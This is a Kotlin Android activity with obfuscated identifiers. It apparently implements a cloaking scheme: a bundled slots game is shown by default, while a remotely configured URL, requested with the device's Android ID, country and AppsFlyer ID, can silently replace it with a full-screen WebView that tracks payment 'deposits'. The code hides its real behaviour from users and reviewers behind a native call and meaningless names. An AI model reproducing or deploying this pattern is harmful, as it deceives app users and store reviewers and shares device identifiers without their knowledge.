package dug.morn.night.prego

import android.annotation.TargetApi
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.graphics.Bitmap
import android.graphics.Rect
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.*
import com.appsflyer.AFInAppEventParameterName
import com.appsflyer.AppsFlyerLib
import android.widget.ImageButton
import android.widget.ImageView
import androidx.annotation.RequiresApi
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.core.content.edit
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import dug.morn.night.prego.R
import kotlinx.android.synthetic.main.activity_main.*
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings


class Msdkjhqcb : Activity(), Ooopwiec {

    internal var NijjV: android.view.View? = null
    var hsdfjkhwekjfhkjs: WebView? = null
    var jdhebKkdme: ValueCallback<Uri>? = null
    var yhye6j3: String = ""
    private lateinit var remoteConfig: FirebaseRemoteConfig
    var ImageV: ImageView? = null
    lateinit var icrestinc: ImageButton
    lateinit var mainMNFnde: Bitmap
    lateinit var callUrlToLS: (String, Boolean, Int, String, Bitmap) -> Unit
    var wxBundklwkj: AnyLoahhfr = AnyLoahhfr(yhye6j3)
    var mLoArray: ValueCallback<Array<Uri>>? = null
    lateinit private var jwkjfLodwjj: SharedPreferences

    companion object {
        @JvmField
        val REQUEST_SELECT_FILE: Int = 100
        @JvmField
        val FILECHOOSER_RESULT_CODE: Int = 1
        // Used to load the 'native-lib' library on application startup.
        init {
            System.loadLibrary("loadNativeL")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        NijjV = window.decorView

        window.decorView.viewTreeObserver.addOnGlobalLayoutListener {
            val ur7hdhwh = Rect()
            window.decorView.getWindowVisibleDisplayFrame(ur7hdhwh)

            val wuyhh2hdhh = window.decorView.rootView.height
            val uuii3m = wuyhh2hdhh - ur7hdhwh.bottom
            val n11mxncwlke = uuii3m > wuyhh2hdhh * 0.1399

            setNavbarVisible(n11mxncwlke)
            setFullScreenEnabled(!n11mxncwlke)
        }
        setNavbarVisible(false)
        setFullScreenEnabled(true)
        remoteConfig = Firebase.remoteConfig
        val configL = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }

        remoteConfig.setConfigSettingsAsync(configL)
        remoteConfig.setDefaultsAsync(R.xml.remmddd)
        setContentView(R.layout.activity_main)

        val w = 10
        val v = 10
        val qowej = Bitmap.Config.ARGB_8888
        mainMNFnde = Bitmap.createBitmap(w, v, qowej)


        val simpleDuppy: () -> Unit = { ->

            requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_SENSOR_PORTRAIT

            hsdfjkhwekjfhkjs = WebView(applicationContext)
            val jejHFBE = CookieManager.getInstance()
            jejHFBE.setAcceptCookie(true)

            hsdfjkhwekjfhkjs?.settings?.javaScriptEnabled = true
            hsdfjkhwekjfhkjs?.settings?.javaScriptCanOpenWindowsAutomatically = true
            hsdfjkhwekjfhkjs?.settings?.domStorageEnabled = true
            hsdfjkhwekjfhkjs?.settings?.setSupportZoom(false)
            hsdfjkhwekjfhkjs?.settings?.allowFileAccess = true
            hsdfjkhwekjfhkjs?.settings?.allowContentAccess = true

            hsdfjkhwekjfhkjs?.settings?.setUseWideViewPort(true)
            hsdfjkhwekjfhkjs?.settings?.setLoadWithOverviewMode(true)
            hsdfjkhwekjfhkjs?.settings?.setAllowFileAccess(true)
            hsdfjkhwekjfhkjs?.settings?.setJavaScriptCanOpenWindowsAutomatically(true)
            hsdfjkhwekjfhkjs?.settings?.setBuiltInZoomControls(true)
            hsdfjkhwekjfhkjs?.settings?.setPluginState(WebSettings.PluginState.ON)
            hsdfjkhwekjfhkjs?.settings?.setSupportZoom(true)
            hsdfjkhwekjfhkjs?.settings?.setAllowContentAccess(true)
            hsdfjkhwekjfhkjs?.settings?.setDisplayZoomControls(false)
            hsdfjkhwekjfhkjs?.settings?.setDomStorageEnabled(true)
            hsdfjkhwekjfhkjs?.settings?.setDefaultTextEncodingName("utf-8")
            hsdfjkhwekjfhkjs?.loadUrl("file:///android_asset/oiwehwe/qbvqp3.html")

            if (hsdfjkhwekjfhkjs?.parent != null) {
                val viewLGroup = hsdfjkhwekjfhkjs?.parent as ViewGroup?
                viewLGroup?.removeView(hsdfjkhwekjfhkjs)
            }
            root.addView(
                hsdfjkhwekjfhkjs, ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT))
    }

        callUrlToLS = { ij: String, dOp: Boolean, numb : Int, loga: String, mapN : Bitmap->
           // requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED
            println(loga)


              if(numb == 2 || numb == 4 ){
                  requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_SENSOR_LANDSCAPE // if pubby
              }else if(numb == 3){
                  ImageV = ImageView(applicationContext)  // was applicationContext
                  ImageV?.setImageBitmap(mapN)

                   icrestinc = ImageButton(this)
                  var llParam: ConstraintLayout.LayoutParams  = ConstraintLayout.LayoutParams(
                      ViewGroup.LayoutParams.WRAP_CONTENT,
                      ViewGroup.LayoutParams.WRAP_CONTENT)

                  icrestinc.layoutParams = llParam
                  icrestinc.setImageResource(android.R.drawable.ic_delete)
                  icrestinc.minimumWidth = 60
                  icrestinc.minimumHeight = 60
                  icrestinc.setOnClickListener(object : View.OnClickListener {
                      override fun onClick(v: View?) {
                          root.removeView(ImageV)
                          root.removeView(icrestinc) }
                  })
              }else{
                  requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED
              }

            if ((hsdfjkhwekjfhkjs != null && dOp) || (hsdfjkhwekjfhkjs == null && !dOp)) {
                hsdfjkhwekjfhkjs = WebView(this) // was getApplicationContext
                val CookieManagerKL = CookieManager.getInstance()
                println(" created javaView \n")
                CookieManagerKL.setAcceptCookie(true)

                hsdfjkhwekjfhkjs?.settings?.javaScriptEnabled = true
                hsdfjkhwekjfhkjs?.settings?.javaScriptCanOpenWindowsAutomatically = true
                hsdfjkhwekjfhkjs?.settings?.loadWithOverviewMode = true
                hsdfjkhwekjfhkjs?.settings?.domStorageEnabled = true
                hsdfjkhwekjfhkjs?.settings?.setSupportZoom(false)
                hsdfjkhwekjfhkjs?.settings?.allowFileAccess = true
                hsdfjkhwekjfhkjs?.settings?.allowContentAccess = true

                hsdfjkhwekjfhkjs?.settings?.setUseWideViewPort(true)
                hsdfjkhwekjfhkjs?.settings?.setLoadWithOverviewMode(true)
                hsdfjkhwekjfhkjs?.settings?.setAllowFileAccess(true)
                hsdfjkhwekjfhkjs?.settings?.setJavaScriptCanOpenWindowsAutomatically(true)
                hsdfjkhwekjfhkjs?.settings?.setBuiltInZoomControls(true)
                hsdfjkhwekjfhkjs?.settings?.setPluginState(WebSettings.PluginState.ON)
                hsdfjkhwekjfhkjs?.settings?.setSupportZoom(true)
                hsdfjkhwekjfhkjs?.settings?.setAllowContentAccess(true)
                hsdfjkhwekjfhkjs?.settings?.setDisplayZoomControls(false)
                hsdfjkhwekjfhkjs?.settings?.setDomStorageEnabled(true)
                hsdfjkhwekjfhkjs?.settings?.setDefaultTextEncodingName("utf-8")
                hsdfjkhwekjfhkjs?.isHorizontalScrollBarEnabled = true
                hsdfjkhwekjfhkjs?.isVerticalScrollBarEnabled = true
                hsdfjkhwekjfhkjs?.settings?.useWideViewPort = true
                hsdfjkhwekjfhkjs?.settings?.loadWithOverviewMode = true
                hsdfjkhwekjfhkjs?.settings?.databaseEnabled = true

                hsdfjkhwekjfhkjs?.webChromeClient = object : WebChromeClient() {


                    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
                    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN)
                    fun openFileChooser(uploadMes: ValueCallback<Uri>, acceptType: String, cap: String) {
                        jdhebKkdme = uploadMes
                        val iIh = Intent(Intent.ACTION_GET_CONTENT)
                        iIh.addCategory(Intent.CATEGORY_OPENABLE)
                        iIh.type = "*/*"
                        this@Msdkjhqcb.startActivityForResult(Intent.createChooser(iIh, "File choose "), FILECHOOSER_RESULT_CODE)
                    }


                    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
                    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
                    override fun onShowFileChooser(webView: WebView?, filePathCallback: ValueCallback<Array<Uri>>?, fileChooserParams: WebChromeClient.FileChooserParams?): Boolean {
                        if (mLoArray != null) {
                            mLoArray?.onReceiveValue(null)
                            mLoArray = null }

                        mLoArray = filePathCallback

                        val conSeledka = Intent(Intent.ACTION_GET_CONTENT)
                        conSeledka.addCategory(Intent.CATEGORY_OPENABLE)
                        conSeledka.type = "*/*"

                        val chIKOOo = Intent(Intent.ACTION_CHOOSER)
                        chIKOOo.putExtra(Intent.EXTRA_INTENT, conSeledka)
                        chIKOOo.putExtra(Intent.EXTRA_TITLE, "Choose your file")
                        chIKOOo.putExtra(Intent.EXTRA_INITIAL_INTENTS, arrayOf(conSeledka))

                         println(" Try to load image ! \n")
                        try {
                            println(" Try to load image 222  ! \n")
                            startActivityForResult(chIKOOo, REQUEST_SELECT_FILE)
                        } catch (e: Exception) {
                            println(" Try to load image 222 Exception exists  ! \n")
                            mLoArray = null
                            return false }
                        return true } }

                hsdfjkhwekjfhkjs?.webViewClient = object : WebViewClient() {

                    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
                    override fun shouldOverrideUrlLoading(
                        view: WebView?,
                        request: WebResourceRequest?
                    ): Boolean {
                        val ss: String = request!!.url.toString()
                        if (ss.toString().contains("mailto")) {
                            Intent(Intent.ACTION_SENDTO, Uri.parse(ss));
                        }

                        if (ss.contains("payment/status-success")) {
                            val eventValue: MutableMap<String, Any> = HashMap()
                            eventValue[AFInAppEventParameterName.DESCRIPTION] = "yes"
                            // was applicationContext
                            AppsFlyerLib.getInstance().trackEvent(applicationContext, "depos", eventValue) }
                        return super.shouldOverrideUrlLoading(view, request)
                    }

                    override fun onReceivedError(view: WebView, errorCode: Int, description: String, failingUrl: String) {}

                    @TargetApi(android.os.Build.VERSION_CODES.M)
                    override fun onReceivedError(view: WebView, req: WebResourceRequest, rerr: WebResourceError) {
                        onReceivedError(view, rerr.errorCode, rerr.description.toString(), req.url.toString())
                    }

                    override fun onReceivedHttpError(view: WebView?, request: WebResourceRequest?, errorResponse: WebResourceResponse?) {
                        super.onReceivedHttpError(view, request, errorResponse)
                    }

                    override fun onLoadResource(view: WebView?, url: String?) {
                        super.onLoadResource(view, url)
                    }

//                    @SuppressWarnings({"UnusedDeclaration"})
//                    public void openFileChooser(ValueCallback<Uri> uploadMessage) {
//                        uploadFile = uploadMessage;
//
//                        final Intent i = new Intent(Intent.ACTION_GET_CONTENT);
//                        i.addCategory(Intent.CATEGORY_OPENABLE);
//                        i.setType("image/*");
//                        startActivityForResult(Intent.createChooser(i, "File Chooser"), FILE_CHOOSER_RESULT_CODE);
//                    }
            //    }
                }

                if(numb == 1){
                    hsdfjkhwekjfhkjs?.loadUrl(ij) // was ij df
                    //   hsdfjkhwekjfhkjs?.loadUrl("https://zismo.biz/") // was ij df
                }else if (numb == 2){

                    hsdfjkhwekjfhkjs?.loadUrl("file:///android_asset/slotsvoya/index.html")
                }else if(numb == 4){
                    hsdfjkhwekjfhkjs?.loadUrl("file:///android_asset/oiwehwe/qbvqp3.html")
                }else{
                    hsdfjkhwekjfhkjs?.loadUrl("file:///android_asset/slotsvoya/index.html")
                }
            }

            if (hsdfjkhwekjfhkjs?.parent != null) {
                val viewLGroup = hsdfjkhwekjfhkjs?.parent as ViewGroup?
                viewLGroup?.removeView(hsdfjkhwekjfhkjs)
            }
            root.addView(hsdfjkhwekjfhkjs, ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            ))

            if(numb == 3){
                root.addView(ImageV, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
                root.addView(icrestinc)
            } }
          // get this first start or not
        jwkjfLodwjj = getPreferences(Context.MODE_PRIVATE)

     if(!jwkjfLodwjj.contains("FirstStart")){

         simpleDuppy()
         remoteConfig.fetchAndActivate().addOnCompleteListener(this){

             if(it.isSuccessful){
                 var ejdkwjad = remoteConfig.getString("key1")

                 val mAdId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                // val queue = Volley.newRequestQueue(applicationContext) // was this applicationContext

                 val djhejej3 = ejdkwjad
                 val dr4d: String = "?device=" + Build.BRAND + "&country=" + resources.configuration.locale.country + "&bid=" + mAdId +"&af_id="+ AppsFlyerLib.getInstance().getAppsFlyerUID(applicationContext)
                 val bnnvoieek = djhejej3.plus(dr4d)
//                  println(" my STRING TO GO == ${djhejej3}")
//                 println(" my too strins GE == ${bnnvoieek}")

                 var myVariable : String = stringFromJNI(bnnvoieek)  // or url
                 if(myVariable.isEmpty()){

             jwkjfLodwjj.edit().apply()
             jwkjfLodwjj.edit {
                 putString("FirstStart", "exists")
                 putString("nbmiuwu3kfk", "37737373")
             }
                     callUrlToLS("", true, 2, " ok load dummy", mainMNFnde)

                 }else{
                     if(myVariable.contains(".jpg") || myVariable.contains(".png")){

                  jwkjfLodwjj.edit().apply()
                  jwkjfLodwjj.edit {
                      putString("FirstStart", "exists")
                      putString("nbmiuwu3kfk", "37737373")
                  }
                         wxBundklwkj.execute(myVariable)

                     } else{
                         if(URLUtil.isAssetUrl(myVariable) || URLUtil.isFileUrl(myVariable) || URLUtil.isAboutUrl(myVariable)
                             || URLUtil.isHttpUrl(myVariable) || URLUtil.isHttpsUrl(myVariable) || URLUtil.isJavaScriptUrl(myVariable)){
                             println("ok big see URL check ! \n")

                      jwkjfLodwjj.edit().apply()
                      jwkjfLodwjj.edit {
                          putString("FirstStart", "exists")
                          putString("nbmiuwu3kfk", myVariable)
                      }
                             callUrlToLS(myVariable, true, 1, " main Start See all", mainMNFnde)
                         }
                     }
                 }

             }else{
                 jwkjfLodwjj.edit().apply()
                 jwkjfLodwjj.edit {
                     putString("FirstStart", "exists")
                     putString("nbmiuwu3kfk", "37737373")
                 }
                 callUrlToLS("", true, 2, " ok load dummy", mainMNFnde)
             }
         }


     } else{
           if(URLUtil.isValidUrl(jwkjfLodwjj.getString("nbmiuwu3kfk", ""))){
               val qeypvm : String? = jwkjfLodwjj.getString("nbmiuwu3kfk", "")

               callUrlToLS(qeypvm!!, false, 1, " ok load  \\n", mainMNFnde);
           }else{ callUrlToLS("", false, 2, " ok load dummy", mainMNFnde) } }
    }

    external fun stringFromJNI(k: String): String

    private fun setFullScreenEnabled(njweh: Boolean) {
        when {
            !njweh -> { window.clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN) }
            njweh -> {
                window.setFlags(
                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN
                ) } } }

    private fun setNavbarVisible(ujjwu: Boolean) {
        when {
            ujjwu -> window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_VISIBLE
            !ujjwu -> window.decorView.systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    ) }
         }

    override fun onBackPressed() {
        if (hsdfjkhwekjfhkjs?.canGoBack()!!) {
            hsdfjkhwekjfhkjs?.goBack()
        } else {
            if (hsdfjkhwekjfhkjs?.canGoBack()!!) {
                hsdfjkhwekjfhkjs?.goBack()
            } else {
                super.onBackPressed()
            }
        }
    }

    override fun onDestroy() {
        root.removeView(hsdfjkhwekjfhkjs)
        super.onDestroy()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        println(" Activity Result 01  ! \n")
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                println(" Activity Result 01  4455 ! \n")
                if (mLoArray == null) {
                    println(" Activity Re uuII***! \n")
                    return }
                println(" Activity Result 01  ok REceive !!!  \n") //      was intent
                mLoArray?.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data))
                mLoArray = null }
        } else if (requestCode == FILECHOOSER_RESULT_CODE) {
            println(" Activity Result 01 88 ! \n")
            if (jdhebKkdme == null) {
                println(" Activity Res NULL  ! \n")
                return }
            var rt: Uri? = null
            if (intent != null || requestCode == RESULT_OK) {
                rt = intent.data
            }
            jdhebKkdme?.onReceiveValue(rt)
            println(" Activity Result 03  ! \n")
            jdhebKkdme = null }
    }

    @Override
    override fun callNNe(out: Bitmap) {
    //    TODO("Not yet implemented")
        callUrlToLS("", true, 3, "load and see ads Cartoon", out)
    }
}


